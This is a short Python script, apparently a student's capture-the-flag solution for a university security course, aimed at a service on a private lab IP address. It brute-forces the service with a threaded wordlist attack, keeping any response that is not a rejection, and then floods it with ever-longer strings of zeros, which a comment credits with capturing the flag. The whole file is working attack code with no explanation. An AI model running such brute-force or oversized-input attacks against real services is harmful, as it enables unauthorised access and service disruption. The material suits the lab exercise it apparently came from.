import socket
import re
import time
wordListFile = open("/home/sparky/Documents/webhost/NTNU-Code/DCSG1002/oblig4/words.txt")
wordList = wordListFile.readlines()
wordsPerClient = 10000
currentSection = 0

def netcat(ip, port, message, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall((message + "\n").encode())
        response = b""
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
        s.close()
        return response.decode()
    except Exception as e:
        return f"Error: {e}"

def client(start, stop):
    runner = start
    results = []
    while runner < stop:
        time.sleep(0.050)
        nc = netcat("10.100.52.65", 3400,"GroupG14 " + wordList[runner].replace("\n", ""))
        if("NOOO! Wrong input" not in nc and "I need at least two arguments" not in nc):  
            results.append(str(runner) + "-" + nc)
        runner +=1
    return results



from concurrent.futures import ThreadPoolExecutor

def process_sections(wordList, wordsPerClient):
    sections = range(0, len(wordList), wordsPerClient)
    def worker(start, end):
        result = client(start, end)
        filename = f"/home/sparky/Documents/webhost/NTNU-Code/DCSG1002/oblig4/results_{start}_{end}.txt"
        with open(filename, "w") as f:
            for item in result:
                f.write(f"{item}\n")
    with ThreadPoolExecutor() as executor:
        futures = []
        for start in sections:
            end = start + wordsPerClient
            futures.append(executor.submit(worker, start, end))
        for future in futures:
            future.result()  # Ensure all tasks complete


#process_sections(wordList, wordsPerClient)
#print(client(0,40))

# Below is what captured the flag lmao 

maxchars = 10000000000
string = ""
while len(string) < maxchars:
    ptr = 0
    while ptr < 10000:
        string += "0"
        ptr +=1
    time.sleep(0.025)
    nc = netcat("10.100.52.65", 3400,"GroupG14 " + string)
    print("len : " + str(len(string)) + " " + nc)

